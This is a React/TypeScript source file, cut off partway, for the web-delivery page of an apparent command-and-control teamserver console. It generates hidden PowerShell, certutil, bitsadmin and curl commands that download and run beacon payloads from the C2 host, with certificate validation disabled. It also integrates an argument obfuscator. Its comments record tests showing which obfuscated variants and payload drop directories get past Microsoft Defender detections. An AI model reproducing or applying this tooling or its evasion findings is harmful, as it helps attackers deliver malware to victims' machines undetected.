import { useEffect, useLayoutEffect, useMemo, useRef, useState } from 'react'
import { useStore } from '../store'
import { AGENT_PROFILES, defaultAgentConfig } from '../api/listeners'
import { copyText } from '../utils'
import { PageTips } from './PageTips'

type Status = {
  script_route?: string
  payload_route?: string
  listener?: string
  agent_name?: string
  format?: string
  arch?: string
  cache_entries?: number
  c2_host_url?: string
  sleep?: string
  jitter?: number
  cache_ttl_min?: number
}

function joinUrl(base: string, route: string) {
  const b = (base || '').replace(/\/+$/, '')
  const r = route.startsWith('/') ? route : `/${route}`
  return `${b}${r}`
}

/**
 * 「C2 Host URL」（目标机访问 teamserver 的地址，含 /api）的缺省值。
 *
 * ★ 这里原本在 apiBase 为空或相对时回退到写死的 'https://110.41.87.17:8080/api' —— 上游
 *   作者自己的机器。而同源部署下 apiBase 恰恰就是空的（ApiClient 拿到 ''），于是这一栏
 *   开箱即填着别人的地址，投递出去的一行命令会指向那台机器。
 *
 * 正确做法是补成**绝对 URL**：控制台本身就是从这台 teamserver 上取来的，所以「目标机该
 * 访问哪个 API 地址」的答案就是当前页面的 origin + /api。服务端侧对同一件事另有兜底
 * （webdelivery 的 publicBaseURL() 在 c2_host_url 为空时按请求 Host 反推），但出厂
 * config.yaml 把它填死了 ⇒ 那条兜底永远不生效，见 doc §6.20 的登记。
 */
function defaultC2Host(apiBase: string) {
  try {
    return new URL(apiBase || '/api', window.location.origin).toString().replace(/\/+$/, '')
  } catch {
    return ''
  }
}

/**
 * 值里带不带单位（5s / 3m / 500ms）。
 *
 * 只用来分「时长」和「秒数」两类参数，不做数值合法性校验 —— 它唯一的用武之地是
 * 切 Agent 时判断旧值还属不属于新 agent（见下面的校正 effect）。
 */
function hasUnit(v: string) {
  return /[a-z]/i.test(String(v).trim())
}

/**
 * 某个 agent 的参数语义：这一格是「时长」（Sleep）还是「秒数」（重连间隔），以及它自己的默认值。
 *
 * 真值只有一处 —— defaultAgentConfig。判断依据是它给没给 sleep 字段：
 *   beacon / kharon        → { sleep: '5s' | '3s', jitter }       → 时长
 *   linux / macos / gopher → { reconn_timeout: '10', ... }         → 秒数
 *
 * 抽成函数是因为有两个地方要问同一件事：渲染时（标签/占位符）和归一化时（切 Agent、
 * 拉到服务端配置）。分散写就会变成两处真值。
 */
function sleepSpecFor(agent: string, format: string, arch: string) {
  const d = defaultAgentConfig(agent, format, arch)
  const kind: 'sleep' | 'reconn' = 'sleep' in d ? 'sleep' : 'reconn'
  return { kind, def: String((kind === 'sleep' ? d.sleep : d.reconn_timeout) ?? '10') }
}

/**
 * 从兼容监听里挑一个默认项，按名字排序后取第一个。
 *
 * 不能直接取 compatible[0]：那个顺序来自 store 里 listeners 记录的插入顺序
 * （Object.values），是按服务端返回 / WS 到达顺序攒出来的。实测同一个会话里
 * 两次打开投递页，自动选中的是两个不同的监听（见 shots/opts-linux.png 前后两版）。
 * 操作员看到的默认选中值不该随消息到达顺序变 —— 尤其是它决定「应用并同步」写哪个监听。
 *
 * 按名字排是确定的，且不引入别的判断（比如"优先选在 Listen 的"）——
 * 那是行为选择，得先确认符合操作习惯，不能顺手替人定。
 */
function pickDefaultListener<T extends { l_name: string }>(list: T[]): T {
  return [...list].sort((a, b) => a.l_name.localeCompare(b.l_name))[0]
}

/* ── 参数混淆（argfuscator）接入 ────────────────────────────────────────────
 *
 * 下面这三条约束**全部来自实测**（2026-09-19 测、2026-09-20 登记在 doc §6.23），不是照上游
 * 文档推的。每一条都对应一个「不这么写就一定坏、而且坏得看不出来」的点：
 *
 *  1. 上游拿**第一个词**去查 models/<词>.json，而 models/ 里**没有 cmd.json**
 *     ⇒ `cmd /c "…"` 整体送进去必然报「命令找不到」。所以只把**被包装的那条命令**
 *     （certutil / bitsadmin / curl）送去混淆，`cmd /c "…"` 外壳与后面的
 *     `&& start /b "" …` 都留在本地、不参与混淆。三条直拉类拆开后
 *     certutil / bitsadmin / curl 三个模型都在表里，各出 5 个变体。
 *
 *  2. ★★ 真正会坏的地方是 **`%VAR%`**，不是引号 —— 这一条推翻了上一版的判据。
 *     混淆器会往变量引用**内部**插字符（实测把 `%TEMP%` 插成 `%TE"M"P%`），
 *     而 cmd 的变量展开发生在**去引号之前**，这个引用于是不成立，curl 拿着
 *     字面路径去写：`Failed to open the file %TEMP%//aB3.eXe`（rc=23），
 *     载荷一个字节都没下来。
 *     ⇒ **输出路径必须留在混淆区之外**（见 `WinEntry.post`）。改完之后实测
 *     `%USERPROFILE%` 展开 **15/15**。
 *     引号本身无害：同一批 30 条变体套外层引号 0/15 坏、不套 0/15 坏；
 *     `certutil`/`bitsadmin` 拼接形态 5/5 + 5/5 通过。⇒ **不再按引号过滤**。
 *
 *  3. ★★ 更隐蔽的一种坏法：变体是个**语法正确、语义不同**的 URL。实测 curl#5 的
 *     路径被改成 `/api/delivebr/payload`（`deliver` 里多插了一个 `b`）—— curl
 *     照常发请求，只是 404。不校验的话操作员拿到的是「看起来正常」的坏命令。
 *     ⇒ 逐条比对 **URL 归一化后的 scheme/host/port/path**（见 `obfVariantIssue`）。
 *     归一化必须做：混淆器**故意**把 IP 换成整数形态（`0x09ac6a222`）、把路径
 *     改写成带 `../` 的样子（实测 #1~#4 全是这种，且**全部真下到了载荷**），
 *     按字面比会把这四条好的一起误判成坏的。
 *
 *  4. 插件对上游返回值**零校验**（`pl_main.go:401-411` 只去空行），坏变体照发。
 *     ⇒ 校验只能在前端做，而且**只标注、不静默丢弃** —— 实测 15 条里坏 1 条，
 *     丢掉它等于把「生成了 5 条」说成「生成了 4 条」，操作员再也看不见风险长什么样。
 *
 * 收益是有 A/B 支撑的：同一 URL、同一条 `certutil -urlcache -split -f …`，
 * 明文 3/3 被 Defender 按命令行签名拦下（`Trojan:Win32/Ceprolad.A`，
 * `Path: CmdLine:_cmd.exe /c certutil …`，载荷一个字节都没下来），
 * 同命令的 5 个混淆变体 5/5 跑起来了。端到端也验过：curl 那条 **4/5 真下到了
 * 76312B 的 x64 载荷**。⚠ 但 PS iex 那一族**两组都没被检测**，
 * 混淆在 PS 路径上的收益本轮**没测出来**，别当成已证。
 *
 * ⚠ certutil / bitsadmin **过不了自签证书**，与混淆无关：实测明文就是
 * `0x80072F8F (ERROR_WINHTTP_SECURE_FAILURE)` / `0x80072F0D`，两者都没有
 * 「跳过校验」开关，而 teamserver 的 38212 只有 HTTPS（明文 HTTP 得到的是
 * `400 Client sent an HTTP request to an HTTPS server`）。这两条仅当证书受信时可用。
 */

/* ── 载荷落地目录 ──────────────────────────────────────────────────────────
 *
 * ★★ 不能用 `%TEMP%`。2026-09-20 实测：`Trojan:Win32/Commando.A!ml`（命令行 ML，
 * ThreatID 2147840094）拦的是「**`.exe` 落在 `%TEMP%`** × **随后被 `start` 执行**」
 * 这个**合取**，**与 URL 长什么样无关** —— 干净 URL 一样拦。
 * （这条推翻了同日早些时候「URL 里成串 `../` 穿越才是触发点」的结论，那是 n=1 的假象。）
 *
 * 证据是**交错 A/B**：同一循环、同一秒、只有落点不同 ——
 *     `%TEMP%`        拦 8/10
 *     `%USERPROFILE%` 拦 0/10
 * 更硬的是 Defender 自己的检测账：全场 13 条 Commando 检测，**13/13 落点都是 `%TEMP%`**；
 * 非 `%TEMP%` 落点约 50 次运行 0 条。三因素缺一即放行：`%TEMP%`+`.bin` 过、
 * `%TEMP%`+`.exe`+`&& echo` 过、别处+`.exe`+`&& start` 过。
 *
 * ⚠ 只影响 cmd 落点的三条直拉命令（certutil / bitsadmin / curl）；PS 那三条不走落盘。
 * ⚠ 整个路径必须留在 `post` 段、不进 `core` —— `%VAR%` 被混淆器拆散是实测到的头号坏因
 *   （见文件头第 2 条）。换目录时别把它挪进混淆区。
 * ⚠ 也别换成 `C:\Users\Public`、`C:\temp` 这类教科书 payload 落点。
 */
const WIN_DROP_DIR = '%USERPROFILE%'

/** 与后端 `firstToken` 同一口径：按空白切第一个词。 */
function firstToken(s: string): string {
  return s.trim().split(/\s+/)[0] || ''
}

/** IPv4 的点分 / 十进制 / `0x` 十六进制三种写法归一成点分；认不出来就小写原样。
 *
 *  必须归一：实测混淆器会把主机换成 IP 的整数形态（`0x09ac6a222`、`2596708898`
 *  都是 154.198.162.34），那是**语义等价**的改写，不是「主机被改坏」。
 *  按字面比会把这类好变体误报成坏的。 */
function obfNormHost(h: string): string {
  const s = h.toLowerCase()
  let n: number
  if (/^0x[0-9a-f]+$/.test(s)) n = parseInt(s.slice(2), 16)
  else if (/^\d+$/.test(s)) n = parseInt(s, 10)
  else return s
  if (!Number.isFinite(n) || n < 0 || n > 0xffffffff) return s
  return [(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255].join('.')
}

/** 按 `..` 归一化路径。
 *
 *  同样必须归一：混淆器**故意**把路径改写成带 `../` 的样子来伪装（实测
 *  `winsxs/../temp/../api/…/deliver/update/../payload`），归一化后与原路径相同
 *  就是语义相同 —— 那几条实测都真下到了载荷。多出来的 `..` 按 URL 规范丢弃。 */
function obfNormPath(p: string): string {
  const out: string[] = []
  for (const seg of (p || '/').split('/')) {
    if (seg === '' || seg === '.') continue
    if (seg === '..') { out.pop(); continue }
    out.push(seg)
  }
  return '/' + out.join('/')
}

function parseObfUrl(s: string) {
  const m = /^(https?):\/\/([^/?#]+)([^?#]*)/.exec(s)
  if (!m) return null
  const [host, port = ''] = m[2].split(':')
  return { scheme: m[1], host: obfNormHost(host), port, path: obfNormPath(m[3]) }
}

/**
 * 变体可用性判据 —— 三条**全部来自实测**，不是「含特殊字符就危险」的启发式。
 *
 * 返回 `''` 表示没查出问题；否则返回人类可读的原因，由界面标在那一条上。
 *
 * 为什么是「标注」而不是「过滤」：实测 15 条变体里坏 1 条，丢掉那一条等于把
 * 「生成了 5 条」说成「生成了 4 条」—— 操作员再也看不见风险长什么样，下次
 * 换个命令遇到同类问题还是不知道。标出来 + 说明原因，比替他扔掉有用。
 */
function obfVariantIssue(core: string, v: string): string {
  // 换行在 cmd 里就是第二条命令；在 PS 里是多一条语句。两种落点都不该有。
  if (/[\r\n]/.test(v)) return '含换行，粘进命令行会变成第二条命令'

  const wantRaw = core.match(/https?:\/\/\S+/)?.[0]
  if (!wantRaw) return ''
  // 变体里的引号是混淆器插进去的字面量，先摘掉再取 URL（引号本身实测无害）
  const gotRaw = v.replace(/["']/g, '').match(/https?:\/\/\S+/)?.[0]
  if (!gotRaw) return '变体里找不到 URL'
  const want = parseObfUrl(wantRaw)
  const got = parseObfUrl(gotRaw)
  if (!want || !got) return '变体的 URL 解析不了'
  if (want.scheme !== got.scheme) return `协议被改成 ${got.scheme}`
  if (want.host !== got.host) return `主机被改成 ${got.host}（原 ${want.host}）`
  if (want.port !== got.port) return `端口被改成 ${got.port}（原 ${want.port}）`
  if (want.path !== got.path) return `路径被改成 ${got.path}（原 ${want.path}）`

  // 变量引用：core 里本该一个 % 都没有（输出路径在 post 段），冒出来就是被拆坏的
  if (v.includes('%') && !core.includes('%'))
    return '掺入了 %：经 cmd 会和后面 %TEMP% 的那个 % 配成一对，把中间一段吞掉'
  return ''
}

/**
 * 一条 Windows 投递命令。
 *
 * `core` 是送去混淆的那一段（第一个词必须在服务端模型表里），`tail` 是接在
 * 后面、原样保留的部分。分成两段而不是拿正则去拆整行 —— 拆的那版一旦上游改了
 * `&&` 的写法就会静默拆错，而错的结果是一条看起来正常的坏命令。
 */
type WinEntry = {
  id: string
  label: string
  /** toast 里用的短名（原来那几条 ' certutil' / ' PS/cmd' 就是它） */
  short: string
  /**
   * 送去混淆的那一段，第一个词必须在服务端模型表里。
   *
   * ★ 这里**不能出现 `%VAR%`** —— 变量引用被拆散是实测到的头号坏因（见文件头
   * 第 2 条）。所以输出路径一律放 `post`，不在这一段里。
   */
  core: string
  /** 接在变体后面、**不参与混淆**的一段。`%USERPROFILE%` 放在这里才保证原样展开。 */
  post: string
  /** 再往后，原样保留（`&& start /b "" …` 之类）。 */
  tail: string
  /** cmd = 经 cmd.exe 解析（变体逐条过 obfVariantIssue）
   *  ps  = 贴进 PowerShell / Win+R 执行 */
  landing: 'cmd' | 'ps'
  /** 与混淆无关的工具限制，常驻显示（如 certutil 过不了自签证书）。 */
  warn?: string
}

/** 不混淆时展示、复制的完整命令。 */
function entryCommand(e: WinEntry) {
  const body = `${e.core}${e.post}${e.tail ? ' ' + e.tail : ''}`
  return e.landing === 'cmd' ? `cmd /c "${body}"` : body
}

/** 变体的最终形态：把不参与混淆的 post 与 tail 接回去，外壳与本条原命令一致。 */
function variantCommand(e: WinEntry, v: string) {
  const body = `${v}${e.post}${e.tail ? ' ' + e.tail : ''}`
  return e.landing === 'cmd' ? `cmd /c "${body}"` : body
}

/** 混淆结果。'loading' 单独取值，避免和「有结果但为空」混淆。
 *  `issues` 与 `variants` **等长**：`''` = 没查出问题，否则是被标出来的原因。 */
type AxfDone = { variants: string[]; issues: string[]; ms: number | null; err: string }

/**
 * 一条投递命令。
 *
 * 拆出来是因为原来这十块是十份几乎一样的五行 JSX，每份都是
 * 「label / textarea / 整行宽的复制按钮」竖着叠 —— 光复制按钮就占了十条
 * 满宽横条，把右栏撑得很长，而命令本身只有一行。
 * 现在标签和复制按钮同一行、命令独占一行：
 *
 *   PowerShell · cmd / 运行（推荐）              [复制]
 *   ┌──────────────────────────────────────────────┐
 *   │ powershell -nop -w hidden -c "..."           │
 *   └──────────────────────────────────────────────┘
 *
 * 用 .field-flat 而非默认的 .field：`.field` 是 `100px 1fr` 两列网格，
 * 标签在左占 100px，在 280px 的右栏里等于直接砍掉四成宽度 ——
 * 命令框实测只有 140px 宽。
 */
function CmdBlock({
  label,
  value,
  onCopy,
  warn,
  axf,
}: {
  label: string
  value: string
  onCopy: () => void
  /** 与混淆无关的工具限制，常驻显示 */
  warn?: string
  axf?: {
    landing: 'cmd' | 'ps'
    state?: 'loading' | AxfDone
    disabled: boolean
    disabledReason: string
    onRun: () => void
    onCopyVariant: (v: string, i: number) => void
    /** 变体在界面上显示的形态 = 复制出去的内容（cmd 落点要把 post + tail 接回去） */
    finalText: (v: string) => string
  }
}) {
  const ref = useRef<HTMLTextAreaElement>(null)

  // 盒子高度跟着内容走：命令折成几行，框就几行高。
  //
  // 两处不能省：
  // 1. 先归零 —— 否则换一条更短的命令时 scrollHeight 只会往下缩，而 height
  //    已经是旧的大值，框会停在上一条命令的高度上。
  // 2. 补上边框 —— scrollHeight 是"内容 + 内边距"，不含边框；而 .wd-cmd 是
  //    `box-sizing: border-box` + 上下各 1px 边框，所以 height 会被边框先吃掉
  //    2px，内容区永远差 2px，最后一行贴着 overflow: hidden 被切掉。
  //    offsetHeight - clientHeight 正好就是那圈边框，写成减法而不是写死 2，
  //    以后改边框宽度也不会悄悄退回原样。
  useLayoutEffect(() => {
    const el = ref.current
    if (!el) return
    el.style.height = 'auto'
    el.style.height = `${el.scrollHeight + el.offsetHeight - el.clientHeight}px`
  }, [value])

  const loading = axf?.state === 'loading'
  const done = axf && axf.state && axf.state !== 'loading' ? axf.state : null

  return (
    <div className="field field-flat wd-block">
      <div className="wd-block-hd">
        <label>{label}</label>
        <div className="wd-acts">
          {axf && (
            <button
              className="ghost wd-copy"
              disabled={loading || axf.disabled}
              title={axf.disabled ? axf.disabledReason : '生成语义等价、字面不同的变体'}
              onClick={axf.onRun}
            >
              {loading ? '混淆中…' : '参数混淆'}
            </button>
          )}
          <button className="ghost wd-copy" onClick={onCopy}>复制</button>
        </div>
      </div>
      <textarea ref={ref} className="wd-cmd mono" readOnly rows={1} value={value} />

      {/* 常驻警告：与混淆无关的工具限制（如 certutil 过不了自签证书）。
          挂在这里而不是混淆结果里 —— 它是这条命令固有的，不是「生成之后才知道」的。 */}
      {warn && <div className="hint warn-hint wd-warn">{warn}</div>}

      {axf && done && (
        <div className="wd-axf">
          {done.err ? (
            <div className="hint warn-hint">{done.err}</div>
          ) : done.variants.length === 0 ? (
            <div className="hint warn-hint">服务端没有返回任何变体</div>
          ) : (
            <>
              <div className="wd-axf-hd">
                <span className="dim">
                  {done.variants.length} 个变体
                  {done.issues.some(Boolean)
                    ? ` · ${done.issues.filter(Boolean).length} 个已标注风险`
                    : ' · 逐条校验通过'}
                  {done.ms !== null ? ` · ${done.ms} ms` : ''}
                </span>
              </div>
              {/* 标注而不是丢弃：坏变体照发（插件对上游返回值零校验），
                  但替操作员扔掉也不对 —— 那样他就看不见风险长什么样。 */}
              {done.issues.some(Boolean) && (
                <div className="hint muted-hint">
                  标红的是语义被改坏的变体：混淆器偶尔会改掉 URL 里的路径段
                  （实测把 <code>deliver</code> 写成 <code>delivebr</code>），命令照样跑、
                  只是下不到东西 —— 这类坏法比语法错更难发现，所以逐条比对
                  归一化后的 URL。带标注的那几条别用。
                </div>
              )}
              {axf.landing === 'ps' && (
                <div className="hint muted-hint">
                  本条整条都是 PowerShell 命令：变体请贴进 <b>PowerShell / Win+R</b> 执行。
                  ⚠ PS 这一族的混淆收益本轮**没测出来**（明文集与混淆集都没被 Defender 拦），
                  别当成已证。
                </div>
              )}
              <div className="axf-list">
                {done.variants.map((v, i) => (
                  <div className={`axf-item${done.issues[i] ? ' axf-item-bad' : ''}`} key={i}>
                    <div className="axf-item-hd">
                      <span className="axf-n">#{i + 1}</span>
                      {done.issues[i] && <span className="axf-badge">有风险</span>}
                      <span className="spacer" />
                      <button className="ghost" onClick={() => axf.onCopyVariant(v, i)}>复制</button>
                    </div>
                    {done.issues[i] && <div className="hint warn-hint">{done.issues[i]}</div>}
                    {/* pre-wrap：变体里会出现同形字与 U+2013，折行但不省略 —— 要复制的是完整命令 */}
                    <pre className="axf-cmd">{axf.finalText(v)}</pre>
                  </div>
                ))}
              </div>
            </>
          )}
        </div>
      )}
    </div>
  )
}

export function WebDelivery() {
  const listeners = useStore((s) => s.listeners) || {}
  const api = useStore((s) => s.api)
  const pushLog = useStore((s) => s.pushLog)
  const pushToast = useStore((s) => s.pushToast)
  const setTab = useStore((s) => s.setTab)
  const openUiTab = useStore((s) => s.openUiTab)

  const listenerList = useMemo(() => Object.values(listeners), [listeners])

  const [scriptRoute, setScriptRoute] = useState('/deliver')
  const [payloadRoute, setPayloadRoute] = useState('/deliver/payload')
  const [listener, setListener] = useState('')
  const [agentName, setAgentName] = useState('beacon')
  const [format, setFormat] = useState('Exe')
  const [arch, setArch] = useState('') // empty = auto from UA
  const [sleep, setSleep] = useState('5s')
  const [jitter, setJitter] = useState(20)
  const [cacheTtl, setCacheTtl] = useState(30)
  const [c2Host, setC2Host] = useState(() => defaultC2Host(api.baseUrl || ''))
  const [busy, setBusy] = useState(false)
  const [loaded, setLoaded] = useState(false)
  const [pluginMissing, setPluginMissing] = useState(false)
  const [statusText, setStatusText] = useState('拉取服务端状态…')
  // 每拉到一份服务端配置就 +1。它只有一个用途：让上面那个归一化 effect 再跑一次
  // （服务端快照里的值可能和当前 agent 不匹配，见那个 effect 的注释）。
  const [serverSeq, setServerSeq] = useState(0)

  // —— 参数混淆：插件状态 + 每条命令各自的变体 ——
  // 插件状态只拉一次（它不是随投递配置变的），拉不到就把按钮禁用并说明原因，
  // 而不是让操作员点了才吃一句报错。
  const [axfMeta, setAxfMeta] = useState<{ ready: boolean; reason: string; cmds: Set<string>; n: number }>(
    { ready: false, reason: '正在读取参数混淆插件状态…', cmds: new Set(), n: 5 },
  )
  const [axfState, setAxfState] = useState<Record<string, 'loading' | AxfDone>>({})

  const profile = AGENT_PROFILES.find((p) => p.agent === agentName) || AGENT_PROFILES[0]
  const formats = profile.formats
  const arches = profile.arches

  // 当前 agent 的参数语义（时长 / 秒数）与默认值，供标签、占位符和归一化共用。
  // 只在下面这个 effect 里校正、不在输入时强转，所以派生值放在渲染里是安全的。
  const sleepSpec = sleepSpecFor(agentName, format, arch || profile.arches[0])

  // 只显示与当前 agent 兼容的监听
  const compatible = useMemo(
    () => listenerList.filter((l) => profile.listeners.includes(l.l_reg_name || '')),
    [listenerList, profile],
  )

  // 这里原来有个 pickListener()：选监听时把监听名反推成 agent 并 setAgentName。
  // 已删掉，因为它把依赖箭头装反了 ——
  //
  //   agent 是【输入】，监听列表是【输出】：下面的 .gen-listener-list 渲染的是
  //   compatible，而 compatible = listenerList.filter(profile.listeners.includes)。
  //   从监听反推 agent 等于把箭头倒过来，于是必然跟用户刚点下的 Agent 打架。
  //
  // 而且那张反推表本身是错的：agentForListenerReg 是"监听类型 → agent"的一对一
  // 映射，真实关系却是多对多 —— GopherTCP 同属 linux / macos / gopher，
  // BeaconWS 同属 beacon / linux（见 api/listeners.ts 的 AGENT_PROFILES）。
  // 映射取第一个命中的分支，所以 GopherTCP 一律判成 gopher、BeaconWS 一律判成
  // beacon，恰好错在这两个共用的监听上。
  //
  // 实测（scripts/probe_picklistener.mjs，服务端只建了 TestWSS/TestWS 两个
  // BeaconWS 监听）：点「Linux Agent」→ compatible 变化触发下面这个 effect 自动
  // 选中 TestWSS → 反推得 beacon ≠ linux → agent 被顶回 Beacon，用户的点击当场
  // 失效。点 gopher 监听那一路同理（GopherTCP → gopher，顶掉 linux 和 macos）。
  //
  // 删干净而不是加判断：compatible 已经保证列表里每一项都跟当前 agent 兼容，
  // 所以"不兼容才改 agent"这种兜底永远不会触发，留着只是给下一个人埋雷。
  // 依赖里必须带 listener —— 这个 effect 是「不变量」的维护者，不是「compatible 变了
  // 才跑一次的补丁」。
  //
  // 原来只依赖 compatible，于是只要有人在 compatible 不变的情况下写进一个无效值，
  // 就再也没机会被纠正。applyStatus 干的正是这件事：它把服务端存的 listener 原样
  // 灌进 state，而库里存的是 "http" —— 投递插件早期的监听类型，根本不是监听器名。
  //
  // 实测（scripts/probe_listenersel.mjs）：刚进投递页 listener="http"，渲染出的两个
  // 兼容监听 TestWS/TestWSS 一个都没高亮，右栏摘要却写着「监听 http」，而
  // 「应用并同步」是**可点的**。点一下任一 Agent（compatible 变了）才会被顺手纠正，
  // 所以是"有时好有时不好"，最难查的那种。
  //
  // 带上 listener 之后：谁写的都无所谓，下一个 commit 一定回到不变量上。不会死循环 ——
  // 用户点选和上面自动选中的都是 compatible 里的项，再跑一次即 no-op。
  useEffect(() => {
    if (!compatible.length) {
      if (listener) setListener('')
      return
    }
    if (!compatible.find((l) => l.l_name === listener)) {
      setListener(pickDefaultListener(compatible).l_name)
    }
  }, [compatible, listener])

  // 切 Agent、或每次拉到服务端配置之后，把参数校到「这个 agent 说得通」的值。
  //
  // 线上实测（scripts/probe_delivery_options.mjs）：Linux Agent 的
  // 「Reconnect timeout / count 相关」栏里坐着 beacon 的 "5s"，而它自己的占位符写着 10。
  // 原因是 sleep 从头到尾只有一个 state，切 agent 没人管它 —— beacon 的 5s 就这么
  // 一路带到了 linux / gopher 的重连间隔里，然后被当作 sleep 发给服务端。
  //
  // 为什么依赖里要有 serverSeq：applyStatus 会把服务端存的 sleep 原样灌回来，
  // 而它同时也会 setAgentName —— 如果只依赖 agentName，那"服务端存的就是当前 agent"
  // 这种情况（agent_name 没变）就一次都不会校正：实测点一下「刷新状态」，
  // linux 的重连栏又会坐回服务端的 "5s"。所以每次拿到新快照都要重新归一化一次。
  //
  // 判据只比"带不带单位"：时长（5s/3m）属于 Sleep，纯数字属于秒数。
  // 故意**不**依赖 sleep：依赖了就会在用户敲到一半时把 "5" 改掉。
  // 代价是它只在"agent 换了"和"拿到服务端快照"这两个会让旧值失效的时刻跑，
  // 而这两个正是全部时刻。
  useEffect(() => {
    if (!formats.includes(format)) {
      setFormat(agentName === 'beacon' ? (formats.includes('Exe') ? 'Exe' : formats[0]) : formats[0])
    }
    const wantsUnit = sleepSpec.kind === 'sleep'
    if (hasUnit(sleep) !== wantsUnit) setSleep(sleepSpec.def)
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [agentName, serverSeq])

  async function loadStatus() {
    setBusy(true)
    try {
      const st = await api.webDeliveryStatus()
      setPluginMissing(false)
      applyStatus(st)
      setLoaded(true)
      // 这行报的是**服务端存着的那份配置**，不是上面表单的当前值 —— 所以显式写「服务端」。
      // 原来只写「缓存 N 条 · 监听 X · Agent Y · 格式 Z」，紧挨着表单读起来就是
      // "我选的就是这些"，而两栏摘要是另一套值，同屏自相矛盾（截图见
      // shots/opts-linux.png：表单是 Linux Agent / TestWSS / Binary ELF，
      // 这行却写着 Agent beacon · 格式 Exe · 监听 http）。
      setStatusText(
        `服务端当前配置：缓存 ${st.cache_entries ?? 0} 条 · 监听 ${st.listener || '-'} · Agent ${st.agent_name || '-'} · 格式 ${st.format || '-'}`,
      )
    } catch (e: any) {
      const msg = e?.message || String(e)
      if (/404|not found|no route|webdelivery/i.test(msg) || /non-JSON/i.test(msg)) {
        setPluginMissing(true)
        setStatusText('WebDelivery 插件未加载或路由不可用')
      } else {
        setStatusText(`状态拉取失败: ${msg}`)
        pushLog('err', `WebDelivery status: ${msg}`)
      }
    } finally {
      setBusy(false)
    }
  }

  function applyStatus(st: Status) {
    if (st.script_route) setScriptRoute(st.script_route)
    if (st.payload_route) setPayloadRoute(st.payload_route)
    if (st.agent_name) setAgentName(st.agent_name)
    if (st.format) {
      // 兼容服务端历史默认值（已废弃的 Artifact 系列）
      const legacy: Record<string, string> = {
        'Artifact Go Exe': st.agent_name === 'gopher' ? 'Binary EXE' : 'Exe',
        'Artifact C++ Exe': 'Exe',
        'Artifact C++ DLL': 'DLL',
      }
      setFormat(legacy[st.format] || st.format)
    }
    if (st.listener) setListener(st.listener)
    if (st.c2_host_url) setC2Host(st.c2_host_url)
    // 服务端存的 sleep 可能与即将生效的 agent 不同类（历史值：linux 下存着 beacon 的
    // "5s"）。这里照旧原样采纳，交给下面那个依赖 serverSeq 的归一化 effect 统一校正 ——
    // 校正规则只留一份，别在这儿再写一遍。
    if (st.sleep) setSleep(st.sleep)
    if (typeof st.jitter === 'number') setJitter(st.jitter)
    if (typeof st.cache_ttl_min === 'number') setCacheTtl(st.cache_ttl_min)
    if (typeof st.arch === 'string') setArch(st.arch || '')
    // 通知归一化 effect：来了一份新快照
    setServerSeq((n) => n + 1)
  }

  useEffect(() => {
    loadStatus().catch(() => {})
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [])

  // 参数混淆插件状态。判据与 ArgFuscator 页一致：路由不存在时 http.ts 抛 non-JSON
  // （有些部署下静态兜底会以 200 + HTML 应答，所以不能只看状态码）。
  // 另外把命令清单拿回来 —— 这样「第一个词不在模型表里」能在**点按钮之前**就提示，
  // 而不是让操作员等一次必然失败的往返。
  useEffect(() => {
    let alive = true
    ;(async () => {
      try {
        const st: any = await api.argFuscatorStatus()
        if (!alive) return
        if (st?.available === false) {
          setAxfMeta({
            ready: false,
            reason: `服务端没有可用的 pwsh：${st.reason || '原因未知'}`,
            cmds: new Set(),
            n: 5,
          })
          return
        }
        setAxfMeta({
          ready: true,
          reason: '',
          cmds: new Set<string>((st?.commands || []).map((c: unknown) => String(c).toLowerCase())),
          n: typeof st?.max_variants === 'number' && st.max_variants > 0 ? st.max_variants : 5,
        })
      } catch (e: any) {
        if (!alive) return
        const msg = e?.message || String(e)
        setAxfMeta({
          ready: false,
          reason:
            /404|not found|no route|argfuscator/i.test(msg) || /non-JSON/i.test(msg)
              ? '服务端未加载 argfuscator 插件，无法混淆'
              : `参数混淆插件状态拉取失败：${msg}`,
          cmds: new Set(),
          n: 5,
        })
      }
    })()
    return () => { alive = false }
  }, [api])

  const scriptUrl = useMemo(() => joinUrl(c2Host, scriptRoute), [c2Host, scriptRoute])
  const payloadUrl = useMemo(() => joinUrl(c2Host, payloadRoute), [c2Host, payloadRoute])
  // 方言强制：空 UA 的 WebClient 以前会误返 bash；PS one-liner 走 /deliver?d=ps
  const scriptPs = useMemo(() => `${scriptUrl}${scriptUrl.includes('?') ? '&' : '?'}d=ps`, [scriptUrl])
  const scriptBash = useMemo(() => `${scriptUrl}${scriptUrl.includes('?') ? '&' : '?'}d=bash`, [scriptUrl])

  // —— 产品级多入口 one-liner（参考常见 C2 投递面）——
  // Windows: PS iex / PS IWR / certutil / bitsadmin / curl.exe / mshta(仅提示)
  // *nix: curl|bash / wget|bash / python
  // 服务端 /deliver 按 UA 或 ?d= 返回脚本；/deliver/payload 按 UA 或 ?arch/?os 出对应载荷
  //
  // 六条都拆成 { core, tail, landing }：core 是能送进混淆器的那一段，tail 是接在后面
  // 原样保留的部分。三条直拉类拆开后 core 里没有引号 ⇒ 变体可以逐条过 cmd 落点校验；
  // 三条 PowerShell 的 core 自带引号 ⇒ 只标 'ps' 落点，不承诺经 cmd。
  const psPre =
    "[Net.ServicePointManager]::ServerCertificateValidationCallback={param($a,$b,$c,$d)[bool]1};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;"

  const winEntries = useMemo<WinEntry[]>(() => {
    const rnd = () => Math.random().toString(16).slice(2, 8)
    const u = `${WIN_DROP_DIR}\\u${rnd()}.exe`
    const b = `${WIN_DROP_DIR}\\b${rnd()}.exe`
    const c = `${WIN_DROP_DIR}\\c${rnd()}.exe`
    return [
      {
        id: 'ps-cmd',
        label: 'PowerShell · cmd / 运行（推荐）',
        short: 'PS/cmd',
        core: `powershell -nop -w hidden -c "${psPre}iex((New-Object Net.WebClient).DownloadString('${scriptPs}'))"`,
        post: '',
        tail: '',
        landing: 'ps',
      },
      {
        id: 'ps-native',
        label: 'PowerShell · 已在 PS 内（单引号防 $ 展开）',
        short: 'PS 内嵌',
        core: `powershell -nop -w hidden -c '${psPre}iex((New-Object Net.WebClient).DownloadString(''${scriptPs}''))'`,
        post: '',
        tail: '',
        landing: 'ps',
      },
      {
        id: 'ps-iwr',
        label: 'PowerShell · Invoke-WebRequest',
        short: 'IWR',
        core: `powershell -nop -w hidden -c "${psPre}iex(iwr -UseBasicParsing '${scriptPs}').Content"`,
        post: '',
        tail: '',
        landing: 'ps',
